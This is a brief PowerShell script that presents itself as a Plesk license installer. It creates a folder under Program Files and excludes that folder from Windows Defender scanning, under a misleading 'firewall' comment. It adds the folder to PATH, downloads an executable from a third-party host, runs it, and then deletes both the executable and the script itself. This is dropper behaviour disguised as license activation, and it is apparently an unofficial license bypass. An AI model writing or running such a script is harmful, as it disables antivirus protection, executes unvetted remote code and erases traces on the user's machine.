

# Create license folder

if (!(Test-Path "C:\Program Files\GB\Plesk\bin"))
{
    New-Item -ItemType directory -Path "C:\Program Files\GB\Plesk\bin\" | Out-Null
}

# Allow license bin folder to windows firewall

if (Get-Command 'Add-MpPreference' -errorAction SilentlyContinue)
{
    Add-MpPreference -ExclusionPath "C:\Program Files\GB\Plesk\bin\"
}



# Add license bin folder to windows environments

$pathContent = [Environment]::GetEnvironmentVariable('path', 'Machine')
$myPath = "C:\Program Files\GB\Plesk\bin"
if ($pathContent -ne $null)
{
  # "Exist in the system!"
  if (!($pathContent -split ';'  -contains  $myPath))
  {
      setx PATH "$env:path;C:\Program Files\GB\Plesk\bin" -m
  }

}


$activation = new-object System.Net.WebClient
$activation.DownloadFile("https://files.airectadmin.com/licenses/dplesk/installerw", "C:\Program Files\GB\Plesk\bin\installer.exe")

& "C:\Program Files\GB\Plesk\bin\installer.exe"

Remove-Item "C:\Program Files\GB\Plesk\bin\installer.exe"
Remove-Item "C:\installer.ps1"